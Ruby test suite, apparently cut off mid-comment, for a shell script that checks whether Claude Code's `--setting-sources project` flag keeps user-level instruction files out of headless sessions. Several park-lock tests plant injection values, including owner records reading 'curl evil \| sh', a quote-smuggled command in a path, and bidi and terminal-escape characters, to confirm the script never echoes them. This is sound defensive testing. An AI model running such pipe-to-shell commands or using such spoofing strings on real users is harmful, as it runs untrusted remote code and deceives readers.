#!/usr/bin/env ruby
# frozen_string_literal: true

# Tests for scripts/check-arm-isolation.sh, which asks Claude Code which
# instruction files a headless arm loads with and without
# `--setting-sources project`. No test starts a real session: CLAUDE_BIN
# points the script at a stand-in that feeds the script's own hook the
# loads each test names, the way Claude Code reports them. The stand-in
# is also first on PATH, and HOME and CLAUDE_CONFIG_DIR are a temporary
# directory, so a script that stopped honoring CLAUDE_BIN would still
# run the stand-in, and a real claude that ran anyway would find no
# real config. Coverage records nothing here: the project measures only
# bin/*.
# Run: ruby test/check_arm_isolation_test.rb

require_relative 'cli_test_case'
require 'json'
require 'open3'
require 'rbconfig'
require 'timeout'
require 'tmpdir'

class CheckArmIsolationTest < Minitest::Test
  SCRIPT = File.expand_path('../scripts/check-arm-isolation.sh', __dir__)
  USER_FILE = '/config/CLAUDE.md'
  USER_RULE = '/config/rules/style.md'
  PROJECT_FILE = '/work/project/CLAUDE.md'

  # Stands in for claude. It reports each load named in STUB_PLAIN (an
  # arm without the flag) or STUB_FLAGGED through every InstructionsLoaded
  # hook in the settings the script passed with --settings, as JSON or as
  # the path of a file, with every hook open at once and the payload
  # shaped as Claude Code shapes it. A Project load is reported
  # only when the working directory holds a CLAUDE.md to load. It
  # records its arguments, settings, working directory, and process ID
  # for the test to read. Knobs, each also taking an arm-specific form
  # (STUB_PLAIN_EXIT, STUB_FLAGGED_STDERR): STUB_EXIT and STUB_STDERR.
  # STUB_VERSION and STUB_VERSION_EXIT set what --version says, and
  # STUB_NEW_ONLY_IN names the one directory it reports a new build
  # from, the way a launcher that picks a build by directory would.
  # STUB_SPACED puts a space after each colon in the payload,
  # STUB_SLEEP holds the arm open for that many seconds, and STUB_PARK
  # names a directory an arm creates while it runs.
  STUB = <<~'RUBY'
    #!/usr/bin/env ruby
    require 'json'
    if ARGV == ['--version']
      old_outside = ENV['STUB_NEW_ONLY_IN'] && Dir.pwd != ENV['STUB_NEW_ONLY_IN']
      puts old_outside ? '2.0.50 (Claude Code)' : ENV.fetch('STUB_VERSION', '9.9.9 (Claude Code)')
      exit Integer(ENV.fetch('STUB_VERSION_EXIT', '0'))
    end
    given = ARGV[ARGV.index('--settings') + 1]
    settings = JSON.parse(given.start_with?('{') ? given : File.read(given))
    mode = given.start_with?('{') ? nil : File.stat(given).mode & 0o777
    File.open(ENV.fetch('STUB_CALLS'), 'a') do |log|
      log.puts JSON.generate('argv' => ARGV, 'cwd' => Dir.pwd, 'pid' => Process.pid, 'settings' => settings,
                             'settings_mode' => mode,
                             'project_file' => File.exist?('CLAUDE.md'),
                             'auto_memory_off' => ENV['CLAUDE_CODE_DISABLE_AUTO_MEMORY'])
    end
    sleep Integer(ENV['STUB_SLEEP']) if ENV['STUB_SLEEP']
    Dir.mkdir(ENV['STUB_PARK']) if ENV['STUB_PARK'] && !Dir.exist?(ENV['STUB_PARK'])
    flagged = ARGV.each_cons(2).any? { |pair| pair == ['--setting-sources', 'project'] }
    arm = flagged ? 'FLAGGED' : 'PLAIN'
    hooks = settings.dig('hooks', 'InstructionsLoaded').flat_map { |entry| entry['hooks'] }
    loads = JSON.parse(ENV.fetch("STUB_#{arm}"))
    loads = loads.reject { |type, _| type == 'Project' } unless File.exist?('CLAUDE.md')
    pipes = loads.flat_map do |type, path|
      payload = { 'session_id' => 'stub', 'transcript_path' => '/stub/transcript.jsonl',
                  'cwd' => Dir.pwd, 'hook_event_name' => 'InstructionsLoaded',
                  'file_path' => path, 'memory_type' => type, 'load_reason' => 'session_start' }
      hooks.map do |hook|
        io = IO.popen(['sh', '-c', hook['command']], 'w')
        io.write(ENV['STUB_SPACED'] ? JSON.generate(payload, space: ' ') : JSON.generate(payload))
        io.flush
        io
      end
    end
    sleep 0.05
    pipes.each(&:close)
    stderr = ENV["STUB_#{arm}_STDERR"] || ENV['STUB_STDERR']
    warn stderr if stderr
    exit Integer(ENV["STUB_#{arm}_EXIT"] || ENV.fetch('STUB_EXIT', '0'))
  RUBY

  def setup
    @tmp = File.realpath(Dir.mktmpdir('check-arm-isolation-test'))
    @stub = File.join(@tmp, 'claude')
    File.write(@stub, STUB)
    File.chmod(0o755, @stub)
    @calls = File.join(@tmp, 'calls')
  end

  def teardown
    FileUtils.rm_rf(@tmp)
  end

  def check_env(plain: [['User', USER_FILE], ['Project', PROJECT_FILE]],
                flagged: [['Project', PROJECT_FILE]], **extra)
    { 'HOME' => @tmp, 'CLAUDE_CONFIG_DIR' => @tmp, 'TMPDIR' => @tmp,
      'PATH' => "#{@tmp}:#{ENV.fetch('PATH')}", 'CLAUDE_BIN' => @stub, 'STUB_CALLS' => @calls,
      'STUB_PLAIN' => JSON.generate(plain), 'STUB_FLAGGED' => JSON.generate(flagged) }
      .merge(extra.transform_keys(&:to_s))
  end

  def check(*args, **options)
    Open3.capture3(check_env(**options), 'bash', SCRIPT, *args)
  end

  def calls
    File.readlines(@calls).map { |line| JSON.parse(line) }
  end

  def flagged_call
    calls.find { |call| call['argv'].include?('--setting-sources') }
  end

  def plain_call
    calls.find { |call| !call['argv'].include?('--setting-sources') }
  end

  def scratch_leftovers(dir = @tmp)
    Dir.glob(File.join(dir, 'check-arm-isolation.*'))
  end

  def assert_no_arm_ran
    refute File.exist?(@calls), 'an arm ran'
  end

  def alive?(pid)
    Process.kill(0, pid)
    true
  rescue Errno::ESRCH
    false
  end

  # --- the verdict ---

  def test_passes_when_the_flag_keeps_every_user_level_file_out
    out, err, status = check(plain: [['User', USER_FILE], ['User', USER_RULE], ['Project', PROJECT_FILE]])

    assert_equal 0, status.exitstatus, err
    assert_match(/isolates an arm on 9\.9\.9/, out)
    assert_match(/2 user-level/, out)
    assert_empty err
  end

  def test_fails_when_a_user_level_file_loads_under_the_flag
    out, err, status = check(flagged: [['User', USER_FILE], ['Project', PROJECT_FILE]])

    assert_equal 1, status.exitstatus, out + err
    assert_includes err, USER_FILE
    assert_match(/does not isolate an arm on 9\.9\.9/, err)
    assert_match(/run no batch that relies on the flag/, err)
    assert_includes err, 'CONTRIBUTING.md'
    refute_match(/park/, err)
    assert_empty out
  end

  def test_names_every_user_level_file_that_leaked_and_no_project_file
    _out, err, status = check(flagged: [['User', USER_FILE], ['User', USER_RULE], ['Project', PROJECT_FILE]])

    assert_equal 1, status.exitstatus, err
    assert_includes err, USER_FILE
    assert_includes err, USER_RULE
    refute_includes err, PROJECT_FILE
  end

  def test_a_leak_is_reported_even_when_the_project_file_goes_unreported
    _out, err, status = check(flagged: [['User', USER_FILE]])

    assert_equal 1, status.exitstatus, err
    assert_includes err, USER_FILE
  end

  def test_reads_a_report_written_with_spaces_after_its_colons
    _out, err, status = check(flagged: [['User', USER_FILE], ['Project', PROJECT_FILE]], STUB_SPACED: '1')

    assert_equal 1, status.exitstatus, err
    assert_includes err, USER_FILE
  end

  def test_names_a_leaked_file_whose_path_has_a_quote_in_it
    quoted = '/config/rules/say "hi".md'

    _out, err, status = check(flagged: [['User', quoted], ['Project', PROJECT_FILE]])

    assert_equal 1, status.exitstatus, err
    assert_includes err, 'say \"hi\".md'
  end

  def test_writes_a_leaked_file_under_the_home_directory_with_a_tilde
    _out, err, status = check(flagged: [['User', "#{@tmp}/.claude/CLAUDE.md"], ['Project', PROJECT_FILE]])

    assert_equal 1, status.exitstatus, err
    assert_includes err, '  ~/.claude/CLAUDE.md'
    refute_includes err, "#{@tmp}/.claude"
  end

  def test_writes_a_leaked_file_with_a_tilde_when_home_ends_in_a_slash
    _out, err, status = check(HOME: "#{@tmp}/",
                              flagged: [['User', "#{@tmp}/.claude/CLAUDE.md"], ['Project', PROJECT_FILE]])

    assert_equal 1, status.exitstatus, err
    assert_includes err, '  ~/.claude/CLAUDE.md'
    refute_includes err, "#{@tmp}/.claude"
  end

  def test_cannot_tell_when_no_user_level_file_loads_even_without_the_flag
    out, err, status = check(plain: [['Project', PROJECT_FILE]])

    assert_equal 2, status.exitstatus, out + err
    assert_match(/cannot tell: no user-level instruction file loaded/, err)
    refute_match(/park/, err)
    assert_empty out
  end

  def test_cannot_tell_when_the_flagged_arm_reports_no_project_file
    out, err, status = check(flagged: [])

    assert_equal 2, status.exitstatus, out + err
    assert_match(/cannot tell: the arm with the flag did not report/, err)
    assert_empty out
  end

  def test_cannot_tell_when_the_unflagged_arm_reports_nothing_at_all
    out, err, status = check(plain: [])

    assert_equal 2, status.exitstatus, out + err
    assert_match(/arm without the flag did not report/, err)
    refute_match(/no user-level instruction file/, err)
  end

  # --- an arm that fails ---

  def test_names_the_unflagged_arm_when_it_alone_fails_and_shows_its_error
    out, err, status = check(STUB_PLAIN_EXIT: '4', STUB_PLAIN_STDERR: "Invalid API key\nPlease sign in",
                             STUB_FLAGGED_STDERR: 'flagged noise')

    assert_equal 2, status.exitstatus, out + err
    assert_match(/cannot tell: the arm without the flag exited 4:/, err)
    assert_includes err, "  Invalid API key\n  Please sign in"
    refute_includes err, 'flagged noise'
    assert_empty out
  end

  def test_names_the_flagged_arm_when_it_alone_fails_and_shows_its_error
    out, err, status = check(STUB_FLAGGED_EXIT: '5', STUB_FLAGGED_STDERR: 'Not logged in',
                             STUB_PLAIN_STDERR: 'plain noise')

    assert_equal 2, status.exitstatus, out + err
    assert_match(/cannot tell: the arm with the flag exited 5:/, err)
    assert_includes err, '  Not logged in'
    refute_includes err, 'plain noise'
    assert_empty out
  end

  def test_an_arm_that_fails_silently_is_reported_as_such
    _out, err, status = check(STUB_EXIT: '3')

    assert_equal 2, status.exitstatus, err
    assert_match(/exited 3:/, err)
    assert_includes err, '  (no error output)'
  end

  # --- how the arms are run ---

  def test_only_one_arm_carries_the_flag
    check

    assert_equal 2, calls.size
    assert flagged_call, 'no arm ran with --setting-sources project'
    assert plain_call, 'no arm ran without the flag'
  end

  def test_both_arms_run_headless_on_haiku
    check

    calls.each do |call|
      assert_includes call['argv'], '-p'
      assert call['argv'].each_cons(2).include?(%w[--model haiku]), 'an arm ran on another model'
    end
  end

  def test_both_arms_run_from_one_scratch_directory_under_tmpdir
    check

    assert_equal plain_call['cwd'], flagged_call['cwd']
    assert plain_call['cwd'].start_with?("#{@tmp}/check-arm-isolation."), plain_call['cwd']
  end

  def test_gives_both_arms_a_project_file_to_report
    check

    calls.each { |call| assert call['project_file'], 'an arm ran in a directory with no CLAUDE.md' }
  end

  def test_both_arms_run_with_session_saving_and_auto_memory_off
    check

    calls.each do |call|
      assert_includes call['argv'], '--no-session-persistence'
      assert_equal '1', call['auto_memory_off']
    end
  end

  # --tools takes any number of values, so the one after its empty
  # value has to be another option.
  def test_neither_arm_is_given_any_tools_or_mcp_servers
    check

    calls.each do |call|
      argv = call['argv']
      tools = argv.index('--tools')
      assert_equal '', argv[tools + 1], 'an arm ran with tools'
      assert argv[tools + 2].start_with?('--'), 'a value follows the empty tool list'
      assert_includes argv, '--strict-mcp-config'
    end
  end

  # --- which claude runs ---

  def test_runs_claude_from_path_when_claude_bin_is_unset
    out, err, status = check(CLAUDE_BIN: nil)

    assert_equal 0, status.exitstatus, out + err
    assert_equal 2, calls.size
  end

  def test_cannot_tell_when_claude_is_not_installed
    out, err, status = check(CLAUDE_BIN: File.join(@tmp, 'no-such-claude'))

    assert_equal 2, status.exitstatus, out + err
    assert_match(/no-such-claude is not installed or not on PATH/, err)
    assert_no_arm_ran
  end

  def test_refuses_a_claude_that_is_not_a_file
    out, err, status = check(CLAUDE_BIN: 'echo')

    assert_equal 2, status.exitstatus, out + err
    assert_match(/not a file/, err)
    assert_no_arm_ran
  end

  def test_works_with_a_relative_path_to_claude
    out, err, status = Dir.chdir(@tmp) { check(CLAUDE_BIN: './claude') }

    assert_equal 0, status.exitstatus, out + err
  end

  # The version guard and the arms must run one binary. PATH is built
  # to hold no real claude, so an arm that looked one up again from the
  # scratch directory finds nothing rather than starting a session.
  def test_runs_the_claude_it_checked_when_path_has_a_relative_entry
    skip 'a real claude sits in /usr/bin or /bin' if %w[/usr/bin /bin].any? { |dir| File.exist?("#{dir}/claude") }
    Dir.mkdir(File.join(@tmp, 'bin'))
    FileUtils.cp(@stub, File.join(@tmp, 'bin', 'claude'))
    Dir.mkdir(File.join(@tmp, 'ruby'))
    File.symlink(RbConfig.ruby, File.join(@tmp, 'ruby', 'ruby'))
    path = ['bin', File.join(@tmp, 'ruby'), '/usr/bin', '/bin'].join(':')

    out, err, status = Dir.chdir(@tmp) { check(CLAUDE_BIN: nil, PATH: path) }

    assert_equal 0, status.exitstatus, out + err
    assert_equal 2, calls.size
  end

  # --- the version guard ---

  def test_starts_no_session_on_a_build_that_deleted_history_under_the_flag
    out, err, status = check(STUB_VERSION: '2.1.100 (Claude Code)')

    assert_equal 2, status.exitstatus, out + err
    assert_match(/Claude Code 2\.1\.100 is older than 2\.1\.101/, err)
    assert_no_arm_ran
  end

  def test_starts_no_session_on_an_older_major_or_minor_whatever_its_patch
    %w[1.0.128 2.0.200].each do |old|
      FileUtils.rm_f(@calls)

      out, err, status = check(STUB_VERSION: "#{old} (Claude Code)")

      assert_equal 2, status.exitstatus, "#{old}: #{out}#{err}"
      assert_match(/older than 2\.1\.101/, err, old)
      refute File.exist?(@calls), "an arm ran on #{old}"
    end
  end

  def test_runs_on_the_first_build_with_the_history_fix
    out, err, status = check(STUB_VERSION: '2.1.101 (Claude Code)')

    assert_equal 0, status.exitstatus, out + err
  end

  def test_runs_on_a_later_minor_or_major_whatever_its_patch
    %w[2.2.0 3.0.0 v2.1.101].each do |newer|
      out, err, status = check(STUB_VERSION: "#{newer} (Claude Code)")

      assert_equal 0, status.exitstatus, "#{newer}: #{out}#{err}"
    end
  end

  def test_starts_no_session_on_a_version_it_cannot_read
    ['2.1', '2.1.100.5', '2.2.0-beta.1', '2.1.1234567', '2.1.99999999999999999999',
     'claude: unknown option'].each do |odd|
      FileUtils.rm_f(@calls)

      out, err, status = check(STUB_VERSION: "#{odd} (Claude Code)")

      assert_equal 2, status.exitstatus, "#{odd}: #{out}#{err}"
      assert_match(/could not read a version/, err, odd)
      assert_includes err, "it printed: #{odd}"
      refute_match(/integer expression/, err, odd)
      refute File.exist?(@calls), "an arm ran on #{odd}"
    end
  end

  def test_starts_no_session_when_asking_for_the_version_fails
    out, err, status = check(STUB_VERSION_EXIT: '1')

    assert_equal 2, status.exitstatus, out + err
    assert_match(/could not read a version/, err)
    assert_no_arm_ran
  end

  def test_reads_the_version_from_the_directory_the_arms_run_in
    out, err, status = Dir.chdir(@tmp) { check(STUB_NEW_ONLY_IN: @tmp) }

    assert_equal 2, status.exitstatus, out + err
    assert_match(/Claude Code 2\.0\.50 is older/, err)
    assert_no_arm_ran
  end

  # --- the scratch directory ---

  def test_removes_its_scratch_directory_after_a_pass
    _out, _err, status = check

    assert_equal 0, status.exitstatus
    assert_empty scratch_leftovers
  end

  def test_removes_its_scratch_directory_when_the_flag_leaks
    _out, _err, status = check(flagged: [['User', USER_FILE]])

    assert_equal 1, status.exitstatus
    assert_empty scratch_leftovers
  end

  def test_removes_its_scratch_directory_when_it_cannot_tell
    _out, _err, status = check(STUB_EXIT: '1')

    assert_equal 2, status.exitstatus
    assert_empty scratch_leftovers
  end

  def test_works_in_a_temporary_directory_with_a_space_in_its_name
    spaced = File.join(@tmp, 'two words')
    Dir.mkdir(spaced)

    out, err, status = check(TMPDIR: spaced)

    assert_equal 0, status.exitstatus, out + err
    assert_empty scratch_leftovers(spaced)
  end

  def test_refuses_a_scratch_path_the_hook_command_cannot_carry
    ["it's", 'say"hi', 'back\\slash'].each do |name|
      odd = File.join(@tmp, name)
      Dir.mkdir(odd)

      out, err, status = check(TMPDIR: odd)

      assert_equal 2, status.exitstatus, "#{name}: #{out}#{err}"
      assert_match(/has a quote or backslash in it/, err, name)
      refute File.exist?(@calls), "an arm ran under #{name}"
      assert_empty scratch_leftovers(odd), name
    end
  end

  def test_refuses_a_scratch_path_with_a_control_character_without_printing_it
    odd = File.join(@tmp, "a\tb")
    Dir.mkdir(odd)

    out, err, status = check(TMPDIR: odd)

    assert_equal 2, status.exitstatus, out + err
    assert_match(/control character/, err)
    refute_includes err, "\t"
    assert_no_arm_ran
    assert_empty scratch_leftovers(odd)
  end

  def test_works_from_a_relative_temporary_directory
    Dir.mkdir(File.join(@tmp, 'rel'))

    out, err, status = Dir.chdir(@tmp) { check(TMPDIR: 'rel') }

    assert_equal 0, status.exitstatus, out + err
    assert_empty scratch_leftovers(File.join(@tmp, 'rel'))
  end

  def test_a_relative_temporary_directory_ignores_cdpath
    Dir.mkdir(File.join(@tmp, 'rel'))

    out, err, status = Dir.chdir(@tmp) { check(TMPDIR: 'rel', CDPATH: @tmp) }

    assert_equal 0, status.exitstatus, out + err
    assert_empty scratch_leftovers(File.join(@tmp, 'rel'))
  end

  def test_works_from_a_temporary_directory_whose_name_starts_with_a_dash
    Dir.mkdir(File.join(@tmp, '-dash'))

    out, err, status = Dir.chdir(@tmp) { check(TMPDIR: '-dash') }

    assert_equal 0, status.exitstatus, out + err
    assert_empty scratch_leftovers(File.join(@tmp, '-dash'))
  end

  # --- being interrupted ---

  def test_a_killed_check_stops_its_arms_and_removes_its_scratch_directory
    script = Process.spawn(check_env(STUB_SLEEP: '30'), 'bash', SCRIPT, out: File::NULL, err: File::NULL)
    Timeout.timeout(10) { sleep 0.05 until File.exist?(@calls) && calls.size == 2 }
    arms = calls.map { |call| call['pid'] }

    Process.kill('TERM', script)
    Process.wait(script)
    Timeout.timeout(10) { sleep 0.05 while arms.any? { |pid| alive?(pid) } }

    assert_empty scratch_leftovers
  ensure
    arms&.each { |pid| Process.kill('KILL', pid) if alive?(pid) }
  end

  # --- a settings file for the arm with the flag ---

  def arm_settings(content = { 'apiKeyHelper' => '/opt/sign-in.sh' }, name: 'sign-in.json')
    path = File.join(@tmp, name)
    File.write(path, content.is_a?(String) ? content : JSON.generate(content))
    path
  end

  def test_hands_the_flagged_arm_the_settings_file_it_is_given
    out, err, status = check(ARM_SETTINGS: arm_settings)

    assert_equal 0, status.exitstatus, out + err
    assert_equal '/opt/sign-in.sh', flagged_call['settings']['apiKeyHelper']
  end

  def test_the_arm_without_the_flag_runs_on_user_settings_alone
    out, err, status = check(ARM_SETTINGS: arm_settings)

    assert_equal 0, status.exitstatus, out + err
    refute plain_call['settings'].key?('apiKeyHelper')
  end

  def test_passes_each_arm_one_settings_value_since_a_second_replaces_the_first
    out, err, status = check(ARM_SETTINGS: arm_settings)

    assert_equal 0, status.exitstatus, out + err
    calls.each { |call| assert_equal 1, call['argv'].count('--settings') }
  end

  # A process's arguments show in ps to every user on the machine.
  def test_keeps_what_the_settings_file_holds_off_the_arms_command_line
    out, err, status = check(ARM_SETTINGS: arm_settings({ 'env' => { 'TOKEN' => 'not-for-ps' } }))

    assert_equal 0, status.exitstatus, out + err
    assert_equal 'not-for-ps', flagged_call['settings'].dig('env', 'TOKEN')
    calls.each { |call| refute_includes call['argv'].join(' '), 'not-for-ps' }
  end

  def test_writes_the_flagged_arms_settings_where_only_this_user_can_read_them
    out, err, status = check(ARM_SETTINGS: arm_settings)

    assert_equal 0, status.exitstatus, out + err
    assert_equal 0o600, flagged_call['settings_mode']
  end

  # A version manager picks a ruby by the directory it is run from.
  def test_runs_ruby_from_the_directory_the_check_was_started_in
    shims = File.join(@tmp, 'shims')
    started = File.join(@tmp, 'started-here')
    [shims, started].each { |dir| Dir.mkdir(dir) }
    File.write(File.join(shims, 'ruby'), <<~SH)
      #!/bin/sh
      case " $* " in *" -rjson "*) pwd > "#{@tmp}/ruby-ran-in" ;; esac
      exec "#{RbConfig.ruby}" "$@"
    SH
    File.chmod(0o755, File.join(shims, 'ruby'))

    out, err, status = Dir.chdir(started) do
      check(ARM_SETTINGS: arm_settings, PATH: "#{shims}:#{@tmp}:#{ENV.fetch('PATH')}")
    end

    assert_equal 0, status.exitstatus, out + err
    assert_equal started, File.read(File.join(@tmp, 'ruby-ran-in')).strip
  end

  def test_reads_a_settings_file_with_a_space_in_its_name
    out, err, status = check(ARM_SETTINGS: arm_settings(name: 'sign in.json'))

    assert_equal 0, status.exitstatus, out + err
    assert_equal '/opt/sign-in.sh', flagged_call['settings']['apiKeyHelper']
  end

  def test_still_reports_a_leak_from_an_arm_given_a_settings_file
    _out, err, status = check(ARM_SETTINGS: arm_settings, flagged: [['User', USER_FILE], ['Project', PROJECT_FILE]])

    assert_equal 1, status.exitstatus, err
    assert_includes err, USER_FILE
  end

  def test_keeps_the_hooks_a_settings_file_already_has
    own = { 'type' => 'command', 'command' => 'true' }
    file = arm_settings({ 'hooks' => { 'InstructionsLoaded' => [{ 'hooks' => [own] }],
                                       'SessionStart' => [{ 'hooks' => [own] }] } })

    out, err, status = check(ARM_SETTINGS: file)
    hooks = flagged_call['settings']['hooks']

    assert_equal 0, status.exitstatus, out + err
    assert_equal 2, hooks['InstructionsLoaded'].size
    assert_includes hooks['InstructionsLoaded'], { 'hooks' => [own] }
    assert_equal [{ 'hooks' => [own] }], hooks['SessionStart']
  end

  def test_reads_a_settings_file_named_relative_to_where_the_check_was_run
    arm_settings

    out, err, status = Dir.chdir(@tmp) { check(ARM_SETTINGS: 'sign-in.json') }

    assert_equal 0, status.exitstatus, out + err
    assert_equal '/opt/sign-in.sh', flagged_call['settings']['apiKeyHelper']
  end

  def test_starts_no_session_when_the_settings_file_is_missing
    out, err, status = check(ARM_SETTINGS: File.join(@tmp, 'no-such.json'))

    assert_equal 2, status.exitstatus, out + err
    assert_match(%r{cannot tell: could not read the ARM_SETTINGS file ~/no-such\.json}, err)
    refute_includes err, @tmp
    assert_no_arm_ran
  end

  def test_starts_no_session_when_the_settings_file_is_a_directory
    out, err, status = check(ARM_SETTINGS: @tmp)

    assert_equal 2, status.exitstatus, out + err
    assert_match(/cannot tell: could not read the ARM_SETTINGS file/, err)
    assert_no_arm_ran
  end

  def test_starts_no_session_when_the_settings_file_is_not_a_json_object
    ['{"apiKeyHelper": ', '["apiKeyHelper"]', '{"hooks": []}', '{"hooks": null}',
     "{\"apiKeyHelper\": \"\xFF\"}".b].each do |content|
      out, err, status = check(ARM_SETTINGS: arm_settings(content))
      shape = content.inspect

      assert_equal 2, status.exitstatus, "#{shape}: #{out}#{err}"
      assert_match(%r{cannot tell: the ARM_SETTINGS file ~/sign-in\.json cannot be used}, err, shape)
      refute_includes err, @tmp, shape
      refute_match(/\.rb:\d+|from -e/, err, shape)
      refute File.exist?(@calls), "an arm ran with #{shape}"
      assert_empty scratch_leftovers, shape
    end
  end

  # The guard runs before anything else is looked up, so a PATH with
  # nothing on it reaches it.
  def test_starts_no_session_when_a_settings_file_is_given_and_ruby_is_missing
    empty = File.join(@tmp, 'empty')
    Dir.mkdir(empty)

    out, err, status = Open3.capture3(check_env(ARM_SETTINGS: arm_settings, PATH: empty), '/bin/bash', SCRIPT)

    assert_equal 2, status.exitstatus, out + err
    assert_match(/ARM_SETTINGS needs ruby/, err)
    assert_no_arm_ran
    assert_empty scratch_leftovers
  end

  # A version manager's shim can be on PATH and still refuse to run.
  def test_tells_a_ruby_that_will_not_run_from_a_settings_file_that_is_wrong
    shims = File.join(@tmp, 'shims')
    Dir.mkdir(shims)
    File.write(File.join(shims, 'ruby'), <<~SH)
      #!/bin/sh
      case " $* " in *" -rjson "*) echo "shim: no version is set" >&2; exit 126 ;; esac
      exec "#{RbConfig.ruby}" "$@"
    SH
    File.chmod(0o755, File.join(shims, 'ruby'))

    out, err, status = check(ARM_SETTINGS: arm_settings, PATH: "#{shims}:#{@tmp}:#{ENV.fetch('PATH')}")

    assert_equal 2, status.exitstatus, out + err
    assert_match(/cannot tell: ruby could not merge the ARM_SETTINGS file/, err)
    assert_includes err, '  shim: no version is set'
    refute_match(/cannot be used/, err)
    assert_no_arm_ran
    assert_empty scratch_leftovers
  end

  def test_points_at_arm_settings_when_the_flagged_arm_alone_fails_without_it
    _out, err, status = check(STUB_FLAGGED_EXIT: '5', STUB_FLAGGED_STDERR: 'Not logged in')

    assert_equal 2, status.exitstatus, err
    assert_match(/set ARM_SETTINGS/, err)
  end

  def test_does_not_point_at_arm_settings_when_one_was_given
    _out, err, status = check(ARM_SETTINGS: arm_settings, STUB_FLAGGED_EXIT: '5')

    assert_equal 2, status.exitstatus, err
    assert_match(/arm with the flag exited 5/, err)
    refute_match(/set ARM_SETTINGS/, err)
  end

  def test_does_not_point_at_arm_settings_when_the_arm_without_the_flag_failed
    _out, err, status = check(STUB_PLAIN_EXIT: '4')

    assert_equal 2, status.exitstatus, err
    assert_match(/arm without the flag exited 4/, err)
    refute_match(/set ARM_SETTINGS/, err)
  end

  # --- a park lock left by an older checkout ---

  def park(dir = @tmp, owner: "checkout=#{@tmp}/old-checkout\npid=4242\nstarted=Sun Oct  4 12:00:00 2026\n")
    lock = File.join(dir, 'CLAUDE.md.park-lock')
    FileUtils.mkdir_p(lock)
    FileUtils.mkdir_p(File.join(@tmp, 'old-checkout'))
    File.write(File.join(lock, 'CLAUDE.md'), "# parked rules\n")
    File.write(File.join(lock, 'owner'), owner) if owner
    lock
  end

  def test_starts_no_session_while_the_user_level_file_sits_in_a_park_lock
    park

    out, err, status = check

    assert_equal 2, status.exitstatus, out + err
    assert_match(/cannot tell: the user-level CLAUDE\.md is parked/, err)
    assert_no_arm_ran
    assert_empty out
  end

  def test_gives_the_commands_that_put_a_parked_file_back
    lock = park

    _out, err, status = check

    assert_equal 2, status.exitstatus, err
    assert_includes err, 'mv -n "$HOME/CLAUDE.md.park-lock/CLAUDE.md" "$HOME/CLAUDE.md"'
    assert_includes err, 'rm -f "$HOME/CLAUDE.md.park-lock/owner" "$HOME/CLAUDE.md.park-lock/owner.tmp"'
    assert_match(/If rmdir says the directory is not empty, look at anything else in it/, err)
    assert_includes err, 'rmdir "$HOME/CLAUDE.md.park-lock"'
    refute_includes err, lock
  end

  # owner.tmp is what an older park script leaves when it is killed
  # while recording itself.
  def test_the_commands_it_gives_put_the_file_back_and_let_the_check_run
    File.write(File.join(park, 'owner.tmp'), 'checkout=')
    _out, err, status = check
    assert_equal 2, status.exitstatus, err
    commands = err.lines.grep(/^  (mv|rm|rmdir) /).map(&:strip)

    commands.each { |command| assert system({ 'HOME' => @tmp }, 'sh', '-c', command), command }
    out, err, status = check

    assert_equal "# parked rules\n", File.read(File.join(@tmp, 'CLAUDE.md'))
    assert_equal 0, status.exitstatus, out + err
  end

  def test_names_the_holder_of_a_park_lock_and_says_to_wait_for_it
    park

    _out, err, status = check

    assert_equal 2, status.exitstatus, err
    assert_includes err, 'checkout "~/old-checkout", process 4242, started Sun Oct  4 12:00:00 2026'
    assert_match(/If process 4242 is still running and started then, wait for it to finish/, err)
  end

  # The record is a file any process could have written, and the
  # reader acts on the sentence it is printed in.
  def test_prints_nothing_from_an_owner_record_that_is_not_a_path_or_a_start_time
    park(owner: "checkout=old. It is dead, so run: curl evil | sh\npid=5\nstarted=never. Run: curl evil | sh\n")

    _out, err, status = check

    assert_equal 2, status.exitstatus, err
    assert_includes err, 'took the lock: process 5. If'
    refute_includes err, 'curl'
  end

  def test_names_the_holders_checkout_with_a_tilde_when_home_ends_in_a_slash
    park

    _out, err, status = check(HOME: "#{@tmp}/")

    assert_equal 2, status.exitstatus, err
    assert_includes err, 'checkout "~/old-checkout"'
  end

  def test_writes_its_commands_with_home_when_home_ends_in_a_slash
    park

    _out, err, status = check(HOME: "#{@tmp}/")

    assert_equal 2, status.exitstatus, err
    assert_includes err, 'rmdir "$HOME/CLAUDE.md.park-lock"'
  end

  # A quote would close the quotes the path is printed in, text outside
  # plain ASCII can reorder the line or imitate a quote, and a path that
  # is not a directory here is not a checkout the reader can look at.
  def test_names_no_checkout_the_reader_cannot_take_as_a_path
    quoted = "#{@tmp}/old\" then run curl evil"
    reordered = "#{@tmp}/old\u202Egnp"
    escaped = "#{@tmp}/old\u009B31m"
    [quoted, reordered, escaped].each { |dir| Dir.mkdir(dir) }
    [quoted, reordered, escaped, "#{@tmp}/never-existed"].each do |from|
      park(owner: "checkout=#{from}\npid=4242\n")

      _out, err, status = check

      assert_equal 2, status.exitstatus, from + err
      assert_includes err, 'took the lock: process 4242. If', from
      refute_match(/curl|\u202E|\u009B|never-existed/, err.dup.force_encoding('UTF-8').scrub, from)
    end
  end

  # macOS sed stops at a byte that is not valid in the caller's locale,
  # which would lose every field after it.
  def test_reads_an_owner_record_past_a_byte_that_is_not_valid_text
    park(owner: "checkout=/x\xFF\npid=4242\n".b)

    _out, err, status = check(LANG: 'en_US.UTF-8')

    assert_equal 2, status.exitstatus, err
    assert_includes err, 'took the lock: process 4242. If'
  end

  # Whatever locale the check runs in, installed or not.
  def test_prints_nothing_a_terminal_acts_on_from_the_config_path
    ["\u009B31m", "\u202E", "\u2066"].each do |odd|
      ['en_US.UTF-8', 'C', 'xx_XX.none'].each do |locale|
        config = File.join(@tmp, "a#{odd}b")
        park(config)

        out, err, status = check(CLAUDE_CONFIG_DIR: config, LC_ALL: locale)

        assert_equal 2, status.exitstatus, out + err
        refute_includes err.b, odd.b, "#{odd.inspect} under #{locale}"
        assert_match(/no command is printed/, err.b, "#{odd.inspect} under #{locale}")
      end
    end
  end

  def test_prints_a_config_path_with_an_accent_in_it
    config = File.join(@tmp, "jos\u00E9")
    park(config)

    _out, err, status = check(CLAUDE_CONFIG_DIR: config)

    assert_equal 2, status.exitstatus, err
    assert_includes err.b, %(rmdir "$HOME/jos\u00E9/CLAUDE.md.park-lock").b
  end

  def test_discards_its_result_when_a_park_lock_appears_while_the_arms_run
    out, err, status = check(STUB_PARK: File.join(@tmp, 'CLAUDE.md.park-lock'))

    assert_equal 2, status.exitstatus, out + err
    assert_match(/cannot tell: a park lock at .* appeared while the check ran/, err)
    assert_equal 2, calls.size
    assert_empty out
    assert_empty scratch_leftovers
  end

  # A harness that parked by renaming the file would leave the user's
